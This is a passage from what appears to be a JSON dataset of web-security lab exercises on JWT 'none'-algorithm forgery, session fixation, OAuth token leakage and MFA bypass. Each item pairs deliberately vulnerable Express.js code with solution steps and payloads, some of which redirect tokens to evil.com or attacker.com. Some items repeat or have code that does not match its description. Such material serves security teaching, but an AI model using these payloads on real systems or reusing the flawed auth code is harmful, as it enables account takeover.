  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username: username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.header.alg === 'none') { res.send('Account details for ' + decoded.payload.username); } else { jwt.verify(token, secret, (err, user) => { if (err) return res.status(403).send('Invalid token'); res.send('Account details for ' + user.username); }); } }); const PORT = 5001; app.listen(PORT, () => console.log('JWT Algorithm Confusion Lab running on http://localhost:' + PORT));",
  "payloads": [
  "JWT header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
  "JWT payload: {\"username\":\"carlos\"}",
  "Authorization: Bearer [forged_token]"
  ]
  },
  {
  "Lab scenario": "OAuth Implicit Flow Token Leakage via Referrer Header",
  "Lab Description": "This lab’s OAuth 2.0 implementation improperly leaks access tokens via the HTTP Referer header. The application uses the implicit grant flow without restricting referrer policies. An attacker can steal tokens embedded in the URL fragment. To solve: steal Carlos's OAuth access token and use it to access his protected resource.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
  "1. Use OWASP ZAP to proxy the OAuth authentication flow and observe that access_token is returned in the URL fragment (#access_token=...).",
  "2. Create an HTML page that embeds a malicious iframe pointing to the OAuth endpoint with redirect_uri set to your domain.",
  "3. Host the malicious page and send it to Carlos.",
  "4. When Carlos authenticates, capture the Referer header containing his token.",
  "5. Replay the access_token using a GET /protected-resource?access_token=[token] request and access Carlos's private data."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/authorize', (req, res) => { const { redirect_uri } = req.query; const accessToken = Math.random().toString(36).substring(2); res.redirect(redirect_uri + '#access_token=' + accessToken); }); app.get('/protected-resource', (req, res) => { const accessToken = req.query.access_token; if (!accessToken) { res.status(401).send('Missing access token'); return; } res.send('Protected data for token: ' + accessToken); }); const PORT = 5002; app.listen(PORT, () => console.log('OAuth Token Leakage Lab running on http://localhost:' + PORT));",
  "payloads": [
  "<iframe src=\"http://victim-site.com/oauth/authorize?client_id=abc&redirect_uri=http://attacker.com/callback\"></iframe>",
  "Capture Referer header with access_token",
  "GET /protected-resource?access_token=[captured_token]"
  ]
  },
  {
    "Lab scenario": "JWT algorithm confusion leading to authentication bypass",
    "Lab Description": "The application uses JWT-based session tokens for user authentication. It mistakenly supports multiple algorithms, including `none`, without enforcing a strict verification policy. The application accepts unsigned JWTs if the `alg` is set to `none`, allowing attackers to forge tokens. To solve: Forge a JWT to impersonate the user 'carlos' and access their account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept JWT after login using Burp Suite and observe the token structure in the Authorization header.",
      "Decode the JWT and observe that it uses the HS256 algorithm and includes a 'sub' claim for the logged-in user.",
      "Craft a new JWT with 'alg' set to 'none' and 'sub' set to 'carlos', then remove the signature portion.",
      "Use Postman to send a request to /account with the forged token in the Authorization header.",
      "Verify successful login as carlos and access the /account page to confirm exploitation."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecret'; const users = [{ username: 'carlos', password: 'admin123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(403).send('Invalid login'); const token = jwt.sign({ sub: username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/account', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; try { const payload = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); if (payload.sub === 'carlos') return res.send('Welcome Carlos!'); res.send('Welcome user'); } catch (err) { res.status(401).send('Unauthorized'); } }); app.listen(3000, () => console.log('JWT Confusion Lab running'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ.",
      "Authorization: Bearer <unsigned_token_with_alg_none>"
    ]
  },
  {
    "Lab scenario": "Session fixation via cookie parameter injection",
    "Lab Description": "The session management mechanism fails to regenerate session identifiers upon login, allowing an attacker to fix a session ID in advance. The application accepts a session cookie from unauthenticated users and keeps it valid post-authentication. To solve: Log in as carlos using a pre-fixed session ID and access their profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to generate a valid session ID by visiting the login page as an unauthenticated user.",
      "Send a phishing request to carlos including a link with the pre-set session ID in the cookie header.",
      "Wait for carlos to log in, causing the session ID to be upgraded to an authenticated state.",
      "Reuse the same session ID to access the /profile endpoint as carlos.",
      "Confirm access to carlos’s profile page to complete the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = [{ username: 'carlos', password: 'carpass' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.send('Invalid'); const sid = req.cookies.sid || Math.random().toString(36).substring(2); sessions[sid] = username; res.cookie('sid', sid); res.send('Logged in'); }); app.get('/profile', (req, res) => { const sid = req.cookies.sid; const username = sessions[sid]; if (username === 'carlos') return res.send('Carlos Profile Data'); res.send('Not authorized'); }); app.listen(4001, () => console.log('Session Fixation Lab running'));",
    "payloads": [
      "Cookie: sid=predefinedsessionid",
      "POST /login with predefined sid cookie",
      "GET /profile with same sid cookie"
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow token leakage via redirect_uri manipulation",
    "Lab Description": "The application uses an OAuth 2.0 implicit flow but improperly validates redirect URIs. The attacker can manipulate the redirect_uri parameter to capture access tokens using their controlled endpoint. To solve: Leak an OAuth token belonging to carlos and use it to access their profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the OAuth authorization request.",
      "Modify the redirect_uri parameter to an attacker-controlled domain (e.g., https://evil.com/callback).",
      "Send a phishing link to carlos and wait for token leakage via fragment (#access_token=...).",
      "Extract the access token from logs on evil.com.",
      "Use Postman to send a GET request to /profile with the leaked token in the Authorization header."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const crypto = require('crypto'); const tokens = {}; const users = [{ username: 'carlos' }]; app.get('/authorize', (req, res) => { const { response_type, client_id, redirect_uri } = req.query; if (response_type === 'token') { const token = crypto.randomBytes(16).toString('hex'); tokens[token] = 'carlos'; return res.redirect(`${redirect_uri}#access_token=${token}`); } res.send('Invalid'); }); app.get('/profile', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (tokens[token] === 'carlos') return res.send('Carlos Profile Accessed'); res.status(401).send('Unauthorized'); }); app.listen(5000, () => console.log('OAuth Token Leak Lab running'));",
    "payloads": [
      "https://vuln.site/authorize?response_type=token&client_id=abc&redirect_uri=https://evil.com/callback",
      "GET /profile with Authorization: Bearer <leaked_token>"
    ]
  },
  {
    "Lab scenario": "Session fixation in password reset flow",
    "Lab Description": "The application allows attackers to fix a session identifier before a user resets their password. The password reset handler reuses the existing session without invalidating or rotating it. To solve: hijack Carlos's session by setting a fixed session ID before he resets his password, then access his My account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Using Burp Suite, generate a session cookie via GET /login with no credentials. Note the session ID value.",
      "2. Visit the Forgot Password feature and submit Carlos's username to trigger a reset link.",
      "3. In Burp, intercept the password reset link request. Copy the reset token from your email panel.",
      "4. Open Burp Repeater and send the reset password request with Carlos's reset token but ensure your fixed session ID is used in the Cookie header.",
      "5. After password reset, send a request to /my-account with the same session cookie to access Carlos's account.",
      "6. Confirm lab completion when Carlos's data is shown."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const cookieParser = require('cookie-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'oldpass' }]; const sessions = {}; const resetTokens = {}; app.get('/login', (req, res) => { const sid = req.cookies.sid || Math.random().toString(36).slice(2); sessions[sid] = null; res.cookie('sid', sid); res.send('Login page'); }); app.post('/forgot', (req, res) => { const { username } = req.body; const token = Math.random().toString(36).slice(2); resetTokens[username] = token; res.send(`Reset link: /reset-password?token=${token}`); }); app.post('/reset-password', (req, res) => { const { token, newPassword } = req.body; const username = Object.keys(resetTokens).find(k => resetTokens[k] === token); if (username) { const user = users.find(u => u.username === username); user.password = newPassword; const sid = req.cookies.sid; sessions[sid] = username; res.send('Password reset'); } else { res.status(403).send('Invalid token'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.sid; const username = sessions[sid]; if (username) res.send(`My account: ${username}`); else res.status(401).send('Unauthorized'); }); app.listen(4000);",
    "payloads": [
      "GET /login -> retrieve Set-Cookie sid=ABC123",
      "POST /reset-password with Cookie: sid=ABC123",
      "GET /my-account with Cookie: sid=ABC123"
    ]
  },
  {
    "Lab scenario": "JWT signature bypass using 'none' algorithm in Authorization header",
    "Lab Description": "This app accepts JSON Web Tokens for authentication, but fails to properly validate the algorithm used. The backend trusts the 'alg' field in the JWT header. To solve: craft a JWT with 'none' algorithm to impersonate the admin and access their account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Log in to your own account and capture the JWT token via Burp Suite (Authorization: Bearer ...).",
      "2. Decode the JWT and observe the header and payload. Identify the use of RS256 algorithm.",
      "3. Modify the JWT header to set 'alg' to 'none', remove the signature part, and change payload 'username' to 'admin'.",
      "4. Use Postman to send a GET /my-account request with the forged JWT in the Authorization header.",
      "5. Verify lab completion when admin's account details are returned."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = { admin: 'adminpass', user: 'userpass' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const token = jwt.sign({ username }, 'privateKey', { algorithm: 'RS256' }); res.json({ token }); } else res.status(401).send('Unauthorized'); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, 'privateKey', { algorithms: ['RS256'] }); res.send(`Hello ${decoded.username}`); } catch (e) { if (token.split('.').length === 2) { const decoded = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); res.send(`Hello ${decoded.username}`); } else res.status(403).send('Invalid JWT'); } }); app.listen(4001);",
    "payloads": [
      "Header: { \"alg\": \"none\", \"typ\": \"JWT\" }",
      "Payload: { \"username\": \"admin\" }",
      "JWT: base64(header).base64(payload).<empty signature>"
    ]
  },
  {
    "Lab scenario": "OAuth access token leakage via referer header in redirect",
    "Lab Description": "The application uses OAuth 2.0 implicit flow and redirects users to a third-party site after authentication. However, the access token is passed in the URL fragment and leaks via the HTTP referer header. To solve: intercept the token leak and use it to access the victim's profile.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "1. Use Burp Suite and log in as a normal user. Observe the OAuth redirect request (URL contains #access_token=...).",
      "2. Note that the final redirect is to a third-party endpoint with your token in the Referer header.",
      "3. Simulate a phishing attack where Carlos logs in using a manipulated OAuth redirect_uri that points to your server.",
      "4. On your malicious server, capture the Referer header and extract Carlos's access_token.",
      "5. Replay a request to GET /profile with the stolen token in Authorization: Bearer header.",
      "6. Confirm lab completion when Carlos's profile is shown."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/callback', (req, res) => { const redirectUri = req.query.redirect_uri; const accessToken = 'abc123-carlos-token'; res.redirect(`${redirectUri}#access_token=${accessToken}`); }); app.get('/profile', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer abc123-carlos-token') res.send('Carlos profile data'); else res.status(403).send('Forbidden'); }); app.listen(4002);",
    "payloads": [
      "Redirect to: /oauth/callback?redirect_uri=http://evil.com/capture",
      "Capture Referer: http://evil.com/capture#access_token=abc123-carlos-token",
      "Replay: GET /profile with Authorization: Bearer abc123-carlos-token"
    ]
  },
  
  {
    "Lab scenario": "Session fixation via login endpoint parameter manipulation",
    "Lab Description": "The application's login endpoint allows an attacker to fix a session ID prior to authentication. The application reuses the existing session identifier after login without regenerating it. To solve: hijack Carlos's session using a fixed session ID to access his profile page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept a GET /login request before login. Observe that the session cookie is set before authentication.",
      "2. With the session ID still valid, forward the login request and note the session cookie is retained after successful login.",
      "3. Use Burp Repeater to send a GET /login request with a fixed session ID, such as session=fix123.",
      "4. Send a phishing email to Carlos with a crafted link: https://vuln-site/login?session=fix123. Once Carlos logs in, his session is tied to fix123.",
      "5. Use Burp with session=fix123 and visit /my-profile. If successful, you access Carlos’s profile and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'weak', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'admin123' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"/><input name=\"password\"/><input type=\"submit\"/></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = username; res.redirect('/my-profile'); } else { res.send('Invalid'); } }); app.get('/my-profile', (req, res) => { if (req.session.user) res.send('Welcome ' + req.session.user); else res.send('Not authenticated'); }); app.listen(4000);",
    "payloads": [
      "GET /login HTTP/1.1\\nCookie: session=fix123",
      "POST /login HTTP/1.1\\nCookie: session=fix123\\nusername=carlos&password=admin123",
      "GET /my-profile HTTP/1.1\\nCookie: session=fix123"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion with 'none' exploit",
    "Lab Description": "This application's JWT-based authentication accepts user-supplied tokens but does not enforce the algorithm used to verify signatures. The backend accepts the 'none' algorithm without signature verification. To solve: create a forged token to log in as the admin user.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "1. Use Burp to capture the Authorization header after logging in with a valid account.",
      "2. Decode the JWT in jwt.io or Burp Decoder and observe the structure: header, payload, signature.",
      "3. Modify the header to include \"alg\":\"none\" and change the payload to {\"user\":\"admin\"}.",
      "4. Remove the signature portion entirely and rebuild the token as header.payload.",
      "5. Replay the modified Authorization: Bearer token to access /admin. If successful, you access the admin dashboard."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'secretkey'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ user: username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('Missing token'); const token = auth.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload.header.alg === 'none') { const user = JSON.parse(Buffer.from(payload.payload, 'base64').toString()).user; if (user === 'admin') return res.send('Admin Access Granted'); return res.status(403).send('Not admin'); } try { const verified = jwt.verify(token, secret); if (verified.user === 'admin') return res.send('Admin Access Granted'); else return res.status(403).send('Forbidden'); } catch { return res.status(403).send('Invalid token'); } }); app.listen(4001);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
      "GET /admin HTTP/1.1\\nAuthorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration allowing unauthorized token usage",
    "Lab Description": "The application integrates OAuth for SSO but fails to validate the client_id and redirect_uri against a whitelist. This allows a malicious actor to reuse an issued token on a forged client. To solve: obtain a valid token and replay it against a vulnerable resource without authorization.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to initiate OAuth login and intercept the authorization flow (GET /oauth/authorize?client_id=trusted-app).",
      "2. Note the access_token in the final redirect_uri after completing login.",
      "3. Modify the client_id to a fake app (evil-client) and reuse the access_token from the legitimate flow.",
      "4. Use Postman to access /account/profile with Authorization: Bearer [reused token] and client_id=evil-client.",
      "5. Confirm access to restricted profile data tied to another client_id, proving token reusability and misconfigured validation."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'carlos', password: 'c@rl0s' }]; const validClients = ['trusted-app']; app.get('/oauth/authorize', (req, res) => { const { client_id, username } = req.query; if (!username) return res.send('Login required'); const token = jwt.sign({ user: username }, 'sharedsecret'); res.redirect(`/callback?access_token=${token}`); }); app.get('/account/profile', (req, res) => { const { authorization } = req.headers; const token = authorization.split(' ')[1]; const payload = jwt.verify(token, 'sharedsecret'); if (!payload || !payload.user) return res.status(403).send('Invalid'); res.send('Profile of ' + payload.user); }); app.listen(4002);",
    "payloads": [
      "GET /oauth/authorize?client_id=trusted-app&username=carlos",
      "GET /callback?access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
      "GET /account/profile HTTP/1.1\\nAuthorization: Bearer [copied_token]"
    ]
  },
  {
    "Lab scenario": "JWT signature disclosure in Authorization header parsing",
    "Lab Description": "The application uses JWTs to authorize API requests but misconfigures signature verification. The header parser leaks the JWT secret in debug mode when an invalid token is submitted. The application trusts any token signed with this secret. To solve: exploit the debug leak, forge a token for user 'admin', and access /admin-panel.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send an invalid JWT token to /api/user-info and inspect the verbose debug output.",
      "Confirm JWT secret leakage in the response body or verbose logs.",
      "Craft a forged JWT with 'alg: HS256' and 'sub: admin', sign it using the leaked secret using jwt.io.",
      "Send the forged JWT in the Authorization header to /admin-panel.",
      "Observe 200 OK and sensitive admin data in the response to verify the exploit."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const SECRET = 'insecuredevsecret'; const DEBUG = true; app.get('/api/user-info', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; try { const decoded = jwt.verify(token, SECRET); res.json({ user: decoded.sub }); } catch (err) { if (DEBUG) return res.status(400).json({ error: err.message, debug: 'SECRET: ' + SECRET }); res.status(401).send('Unauthorized'); } }); app.get('/admin-panel', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; const decoded = jwt.verify(token, SECRET); if (decoded.sub === 'admin') return res.send('Welcome Admin'); res.status(403).send('Forbidden'); }); app.listen(3000);",
    "payloads": [
      "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.XN4iAZF0aDlLuIP6_1dp1zN8vGh44iEtVPGwrfEVmSk"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration allowing token reuse",
    "Lab Description": "The application integrates third-party OAuth for login. It reuses old authorization codes and does not bind tokens to sessions. This allows replaying a leaked code to impersonate another user. To solve: extract an intercepted OAuth code from logs, reuse it to generate a valid token for 'victim@example.com', and access their profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to capture a complete OAuth login flow for your own account and analyze the exchange.",
      "Find an old intercepted code for victim@example.com in the application debug endpoint /oauth/logs.",
      "Replay the intercepted code against /oauth/token endpoint to obtain an active access token.",
      "Use this token in the Authorization header to call /api/profile.",
      "Confirm the profile response shows victim@example.com details."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); let issuedCodes = { 'abc123': 'victim@example.com' }; let accessTokens = {}; app.post('/oauth/token', (req, res) => { const { code } = req.body; if (issuedCodes[code]) { const token = Buffer.from(issuedCodes[code]).toString('base64'); accessTokens[token] = issuedCodes[code]; return res.json({ access_token: token }); } res.status(400).send('Invalid code'); }); app.get('/api/profile', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (accessTokens[token]) return res.json({ email: accessTokens[token] }); res.status(403).send('Invalid token'); }); app.get('/oauth/logs', (req, res) => { res.json({ logs: [{ code: 'abc123', email: 'victim@example.com' }] }); }); app.listen(4000);",
    "payloads": [
      "POST /oauth/token { \"code\": \"abc123\" }",
      "GET /api/profile with Authorization: Bearer dmljdGltQGV4YW1wbGUuY29t"
    ]
  },
  {
    "Lab scenario": "Session fixation via insecure Set-Cookie path scoping",
    "Lab Description": "The application sets a session cookie with path=/login only, allowing an attacker to pre-set a session cookie that persists during victim login. This enables session fixation attacks. To solve: set a session cookie with fixed ID, trick victim into login, then hijack session to access /my-account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to intercept response from /login and confirm the Set-Cookie path=/login attribute.",
      "Send a crafted request with a fixed session ID to /login and forward it to the victim.",
      "After the victim logs in, reuse the fixed session ID to access /my-account.",
      "Observe the victim’s data returned to confirm the session takeover.",
      "Ensure the session ID is stable and no additional session regeneration occurs."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = { 'victim': 'letmein' }; app.post('/login', (req, res) => { const sessionId = req.cookies['sessid'] || Math.random().toString(36).slice(2); res.setHeader('Set-Cookie', `sessid=${sessionId}; Path=/login`); const { username, password } = req.query; if (users[username] === password) { sessions[sessionId] = username; res.send('Login successful'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies['sessid']]; if (user) return res.send('Account data for ' + user); res.send('Unauthorized'); }); app.listen(5000);",
    "payloads": [
      "Set Cookie: sessid=fixedsession123",
      "GET /login?username=victim&password=letmein",
      "GET /my-account with Cookie: sessid=fixedsession123"
    ]
  },
  {
    "Lab scenario": "MFA bypass via logic bug in verification fallback",
    "Lab Description": "The MFA mechanism includes a logic flaw where failure to submit a token defaults to a verified state if the user is marked 'trusted'. The application misclassifies users as trusted after a single login attempt. To solve: log in, ensure 'trusted' flag is set, then omit the MFA step and access sensitive resources.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Log in with correct credentials to trigger 'trusted' state setting.",
      "Use Burp to intercept POST /mfa-verify and send request without the token parameter.",
      "Observe response indicating access granted despite no MFA validation.",
      "Access /settings page using session cookie to confirm bypass.",
      "Repeat the flow to ensure consistent bypass across sessions."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(express.urlencoded({ extended: true })); app.use(session({ secret: 'devsecret', resave: false, saveUninitialized: true })); const users = { 'alice': { password: 'securepass', trusted: false } }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] && users[username].password === password) { req.session.user = username; users[username].trusted = true; res.redirect('/mfa-verify'); } else { res.send('Login failed'); } }); app.post('/mfa-verify', (req, res) => { const user = req.session.user; if (users[user].trusted) return res.redirect('/settings'); if (req.body.token === '654321') return res.redirect('/settings'); res.send('MFA failed'); }); app.get('/settings', (req, res) => { if (req.session.user) return res.send('Settings for ' + req.session.user); res.send('Unauthorized'); }); app.listen(6000);",
    "payloads": [
      "POST /login username=alice&password=securepass",
      "POST /mfa-verify with no token parameter",
      "GET /settings with valid session cookie"
    ]
  },
  {
    "Lab scenario": "Session Fixation in OAuth Authorization Flow",
    "Lab Description": "The lab simulates a third-party login using OAuth. The application does not properly regenerate session identifiers after OAuth authentication. An attacker can fixate a session ID prior to login. To solve: hijack a victim’s session post-OAuth login using a pre-set session token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Using Burp Suite, navigate to the /auth/initiate endpoint and observe the OAuth redirect to /auth/callback.",
      "2.Intercept the request to /auth/initiate and extract the session cookie. Share the session token with the victim.",
      "3.Wait for the victim to complete the OAuth login using the shared session (or simulate it).",
      "4.After the victim completes login, reuse the fixed session cookie from step 2.",
      "5.Send a GET /my-account request with the fixed session cookie and verify access to the victim’s account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const request = require('request'); const app = express(); app.use(cookieParser()); const sessions = {}; app.get('/auth/initiate', (req, res) => { const sid = Math.random().toString(36).substring(2); sessions[sid] = { authenticated: false }; res.cookie('sid', sid); res.redirect('https://oauth-provider.com/auth?redirect_uri=http://localhost:4000/auth/callback'); }); app.get('/auth/callback', (req, res) => { const sid = req.cookies.sid; if (sessions[sid]) { sessions[sid].authenticated = true; sessions[sid].user = 'victim'; res.redirect('/my-account'); } else { res.status(400).send('Invalid session'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.sid; if (sessions[sid]?.authenticated) { res.send('Account page of ' + sessions[sid].user); } else { res.status(403).send('Forbidden'); } }); app.listen(4000);",
    "payloads": [
      "Fix session ID before victim logs in: Cookie: sid=abc123",
      "Re-use same Cookie: sid=abc123 after victim logs in via OAuth"
    ]
  },
  {
    "Lab scenario": "JWT none algorithm authentication bypass",
    "Lab Description": "This application uses JWT tokens for session handling. However, it accepts tokens signed with the 'none' algorithm without verifying the signature. To solve: forge a JWT with alg=none to impersonate the admin user and access the admin panel.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1.Log in as a regular user and intercept the JWT using Burp Suite.",
      "2.Decode the JWT using jwt.io or Postman and observe it uses RS256 algorithm.",
      "3.Craft a new JWT header with \"alg\": \"none\" and payload with \"user\": \"admin\".",
      "4.Remove the signature part and use this token in the Authorization header.",
      "5.Send a GET /admin request with the forged token and verify access is granted."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (!token) return res.status(403).send('No token'); const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.user === 'admin') return res.send('Welcome Admin'); } try { const verified = jwt.verify(token, 'supersecret'); if (verified.user === 'admin') return res.send('Welcome Admin'); } catch { res.status(403).send('Invalid token'); } }); app.listen(4001);",
    "payloads": [
      "Header: {\"alg\":\"none\"}",
      "Payload: {\"user\":\"admin\"}",
      "JWT: base64url(header).base64url(payload)."
    ]
  },
  {
    "Lab scenario": "Session fixation via login endpoint on SOAP API",
    "Lab Description": "The backend SOAP service fails to invalidate old session IDs during login. This allows an attacker to fixate a known session and later hijack a victim's authenticated session. To solve: capture a session before login, fixate it, and use it to access the victim’s session.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1.Capture a SOAP login request using Burp Suite. Note the sessionID in the Set-Cookie response.",
      "2.Share or implant the fixed session cookie into the victim’s browser.",
      "3.Wait for the victim to log in normally using the fixed session.",
      "4.Reuse the same session cookie and send a SOAP request to /soap/getProfile.",
      "5.Verify that the session is now authenticated and data returned belongs to the victim."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const cookieParser = require('cookie-parser'); const app = express(); app.use(bodyParser.text()); app.use(cookieParser()); const sessions = {}; app.post('/soap/login', (req, res) => { const sid = req.cookies.sid || Math.random().toString(36).substring(2); sessions[sid] = { user: 'victim' }; res.cookie('sid', sid); res.send(`<soap:Envelope><soap:Body><loginResponse>OK</loginResponse></soap:Body></soap:Envelope>`); }); app.post('/soap/getProfile', (req, res) => { const sid = req.cookies.sid; if (sessions[sid]?.user) { res.send(`<soap:Envelope><soap:Body><profile>User: ${sessions[sid].user}</profile></soap:Body></soap:Envelope>`); } else { res.status(403).send('Invalid session'); } }); app.listen(4002);",
    "payloads": [
      "Fix sessionID before victim login: Cookie: sid=xyz999",
      "Reuse same Cookie: sid=xyz999 to call /soap/getProfile after victim logs in"
    ]
  },
  {
    "Lab scenario": "Session fixation via upgrade flow in REST login",
    "Lab Description": "The application uses session-based authentication and supports an 'upgrade' mechanism where unauthenticated sessions can be promoted after login. The session ID is not regenerated upon successful login, allowing fixation. To solve: Fixate a session ID and login as Carlos without knowing his credentials.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite Proxy to capture the GET /session request and extract the Set-Cookie header (unauthenticated session ID).",
      "Use OWASP ZAP to confirm that the same session persists across pre-auth and post-auth requests.",
      "Craft a phishing endpoint that forces Carlos to authenticate while using the fixated session ID in their browser (sent via link or injected in iframe).",
      "Once Carlos logs in with the fixated session ID, reuse the same ID to access the authenticated session.",
      "Visit /my-account with the stolen session ID to confirm access to Carlos’s account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); app.use(session({ secret: 'fixation-secret', resave: false, saveUninitialized: true })); const users = { 'carlos': 'hunter2' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { req.session.username = username; res.send('Login successful'); } else { res.status(401).send('Invalid login'); } }); app.get('/my-account', (req, res) => { if (req.session.username) res.send('Sensitive account data for ' + req.session.username); else res.status(403).send('Not authenticated'); }); app.listen(3000);",
    "payloads": [
      "Reuse session ID across victim login and attacker session",
      "GET /login with fixated JSESSIONID",
      "Send phishing link with fixated cookie: JSESSIONID=attacker123"
    ]
  },
  {
    "Lab scenario": "JWT none algorithm override in GraphQL login API",
